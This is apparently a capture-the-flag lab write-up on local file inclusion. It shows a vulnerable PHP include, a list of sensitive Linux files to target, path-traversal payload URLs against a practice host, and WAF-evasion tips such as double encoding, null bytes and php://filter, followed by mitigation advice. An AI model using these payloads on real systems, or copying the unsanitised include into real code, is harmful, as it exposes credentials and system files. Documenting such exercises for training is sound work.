# Local File Inclusion (LFI) Vulnerability Testing

## What is LFI?

**Local File Inclusion (LFI)** is a vulnerability that allows an attacker to include files on a server through the web browser. This typically occurs when the web application uses user input to construct paths to files and doesn't properly sanitize it.

## Testing Endpoint


**Target URL:**  
`https://defhawk.com/battleground/practice-lab/all-categories/web/enumerate`

`http://web.labs.defhawk.com:12000/`

**Vulnerable Parameter:**  
`sample`

## How the Vulnerability Works

Suppose the code in the backend looks like:

```php
<?php 
  include($_GET['sample']); 
?>
````

If no validation is done on the `sample` parameter, then supplying a path like `/etc/passwd` or using directory traversal like `../../../../etc/passwd` may include unintended files from the server.

## Common Sensitive Linux Files to Target

| File                          | Description                                           |
| ----------------------------- | ----------------------------------------------------- |
| `/etc/passwd`                 | Lists user accounts on the system                     |
| `/etc/shadow`                 | Contains hashed user passwords (requires root access) |
| `/var/log/apache2/access.log` | Apache access logs                                    |
| `/proc/self/environ`          | Environment variables including `PATH`, etc.          |
| `/etc/hosts`                  | Local DNS records                                     |
| `/etc/hostname`               | Server’s hostname                                     |
| `/root/.bash_history`         | Command history of root                               |
| `/var/www/html/config.php`    | Possible web app credentials                          |

> Reference: [Linux Sensitive Files - InfoSecWarrior](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Linux-Sensitive-Files.txt)

## Relative vs Absolute Paths

* **Absolute Path**: Direct path from root (e.g., `/etc/passwd`)
* **Relative Path**: Based on current directory (e.g., `../../../../etc/passwd`)

Understanding the relative path helps in crafting traversal payloads depending on where the vulnerable file (`app.php`) is located. In our case:

```
/var/www/html/app.php
```

## 🎯 Payload Testing

### ❌ Payload 1 – No Output

```
http://web.labs.defhawk.com:12000/search?term=/etc/passwd&sample=Sample1
```

### ❌ Payload 2 – No Output

```
http://web.labs.defhawk.com:12000/search?term=/etc/passwd&sample=/etc/passwd
```

### ❌ Payload 3 – No Output

```
http://web.labs.defhawk.com:12000/search?term=../../../etc/passwd&sample=../../../etc/passwd
```

### ✅ Payload 4 – Successful File Inclusion

```
http://web.labs.defhawk.com:12000/search?term=.././../../../../../../etc/passwd&sample=../../../../../../../etc/passwd
http://web.labs.defhawk.com:12000/search?term=../../../../../etc/passwd&sample=../../../../etc/passwd
http://web.labs.defhawk.com:12000/search?term=test&sample=../../../../../etc/passwd
```

This confirms the server includes files based on user input in the `sample` parameter.

## 🔐 Tips for Bypassing Filters

* Use mixed traversal like `.././../`
* Use URL encoding:

  * `%2e` → `.`
  * `%2f` → `/`
  * Example: `..%2f..%2f..%2fetc%2fpasswd`
* Use double URL encoding to evade WAF:

  * `%252e%252e%252f`

## 🔁 Bypassing LFI Protections

If basic LFI payloads don’t work, try these:

| Technique                                 | Example                                                |
| ----------------------------------------- | ------------------------------------------------------ |
| Null byte injection                       | `/etc/passwd%00` (for older PHP versions)              |
| Filter bypass                             | `....//....//etc/passwd`                               |
| Base64 wrappers (if PHP wrappers enabled) | `php://filter/convert.base64-encode/resource=filename` |


## Reference Links

* OWASP WSTG: [Testing for LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
* Linux Sensitive Files List: [GitHub - InfoSecWarrior](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Linux-Sensitive-Files.txt)

## Mitigation

To prevent LFI:

* Whitelist file paths or use file ID mapping.
* Avoid including files based on user input.
* Validate and sanitize user inputs.
* Disable dangerous PHP functions like `include`, `require`, `fopen` if not needed.
